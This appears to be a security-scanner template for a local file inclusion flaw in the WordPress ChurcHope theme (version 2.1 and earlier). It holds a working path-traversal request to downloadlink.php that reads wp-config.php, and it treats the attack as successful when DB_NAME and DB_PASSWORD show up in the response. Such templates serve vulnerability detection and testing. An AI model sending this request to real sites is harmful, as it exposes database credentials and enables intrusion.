id: churchope-lfi
brief:
    title: WordPress ChurcHope Theme <= 2.1 - Local File Inclusion
    by: dhiyaneshDK
    level: high
    about: WordPress ChurcHope Theme <= 2.1 is susceptible to local file inclusion. The vulnerability is caused by improper filtration of user-supplied input passed via the 'file' HTTP GET parameter to the '/...
    label:
        - wp
        - wpscan
        - wordpress
        - wp-theme
        - lfi
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php'
      signs:
        - "on": word
          has:
            - DB_NAME
            - DB_PASSWORD
          in: body
          need: all
        - "on": status
          status:
            - 200
